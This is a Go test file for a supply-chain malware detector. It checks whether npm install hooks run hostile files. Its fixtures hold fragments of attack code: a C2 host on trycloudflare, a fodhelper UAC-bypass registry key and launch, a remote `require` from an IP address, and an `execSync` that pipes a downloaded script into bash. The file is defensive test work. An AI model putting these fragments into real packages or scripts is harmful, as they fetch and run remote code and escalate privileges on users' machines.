package detect

import (
	"path"
	"testing"
)

// The metrics-probe-9b4c shape (GCVE-110-NPM-2026-033137): the hooks run a file whose contents only
// a hook surface makes hostile. Scanned as library content, both lines below are context.
const metricsProbeRun = `const C2_HOST = 'detector-blonde-instructional-circular.trycloudflare.com';
const regKey = 'HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command';
await runCmd('start "" "C:\\Windows\\System32\\fodhelper.exe"', 3000);
`

func npmPkg(hooks, file, body string) *PackageContext {
	return &PackageContext{
		Name: "p", Ecosystem: "npm",
		InstallScriptContent: hooks,
		PkgbuildContent:      hooks + "\n// ==== package/package.json ====\n{}\n// ==== package/" + file + " ====\n" + body,
	}
}

func TestNpmHookFileIsInstallSurface(t *testing.T) {
	fs := Detect(npmPkg("preinstall: node run.js\npostinstall: node run.js\n", "run.js", metricsProbeRun))
	for _, id := range []string{"IS-P-UAC-BYPASS", "IS-P-TRYCLOUDFLARE"} {
		if classOfID(fs, id) != ClassEvidence {
			t.Errorf("%s: class %q, want evidence; findings %v", id, classOfID(fs, id), ids(fs))
		}
	}
	if !CombinedVerdict(fs).Malicious {
		t.Error("hook file must mint")
	}
	// The same file, not run by any hook, is library content: context only.
	lib := Detect(npmPkg("test: node run.js\n", "run.js", metricsProbeRun))
	if CombinedVerdict(lib).Malicious {
		t.Errorf("unhooked file minted: %v", ids(lib))
	}
}

func TestNpmHookNodeTargets(t *testing.T) {
	for hooks, want := range map[string]string{
		"postinstall: node ./scripts/postinstall.js":      "scripts/postinstall.js",
		"install: node --no-warnings install.cjs || true": "install.cjs",
		`preinstall: node "lib/check.mjs" && echo ok`:     "lib/check.mjs",
		"postinstall: node-gyp rebuild":                   "",
	} {
		ctx := npmPkg(hooks, "x.js", "")
		got := ""
		for _, m := range npmHookNodeRe.FindAllStringSubmatch(ctx.InstallScriptContent, -1) {
			got = path.Clean(m[1])
		}
		if got != want {
			t.Errorf("%q: target %q, want %q", hooks, got, want)
		}
	}
}

// JS-INSTALL-REMOTE-IMPORT reads what runs at install when the processor passes the hooks.
func TestNpmRemoteImportScopedToInstall(t *testing.T) {
	esm := `import confetti from "https://cdn.skypack.dev/canvas-confetti";` + "\n"
	lib := Detect(npmPkg("postinstall: node scripts/setup.js\n", "dist/browser.js", esm))
	if has(lib, "JS-INSTALL-REMOTE-IMPORT") {
		t.Error("a browser ESM import in a library file fired")
	}
	hook := Detect(npmPkg("postinstall: node scripts/setup.js\n", "scripts/setup.js", `require("https://203.0.113.9/p.js")`+"\n"))
	if !has(hook, "JS-INSTALL-REMOTE-IMPORT") {
		t.Errorf("remote require in the hook file not detected: %v", ids(hook))
	}
	css := Detect(npmPkg("postinstall: node scripts/setup.js\n", "scripts/setup.js", `const s = "@import url('https://fonts.googleapis.com/css2')";`+"\n"))
	if has(css, "JS-INSTALL-REMOTE-IMPORT") {
		t.Error("a CSS @import fired")
	}
}

// A postinstall script's printed install hint is a bare string literal, not a command it runs.
func TestNpmHookFilePrintedHintIsNotEvidence(t *testing.T) {
	hint := "const tips = [\n  \"curl -fsSL https://raw.githubusercontent.com/acme/cli/master/install.sh | bash\",\n  '  - or:  curl -fsSL https://acme.example/i.sh | bash\\n' +\n];\n"
	if has(Detect(npmPkg("postinstall: node scripts/postinstall.mjs\n", "scripts/postinstall.mjs", hint)), "IS-P-CURL-PIPE") {
		t.Error("printed hint fired")
	}
	run := "require('child_process').execSync('curl -fsSL https://203.0.113.9/i.sh | bash');\n"
	if !has(Detect(npmPkg("postinstall: node scripts/postinstall.mjs\n", "scripts/postinstall.mjs", run)), "IS-P-CURL-PIPE") {
		t.Error("a curl | bash the hook executes must fire")
	}
}
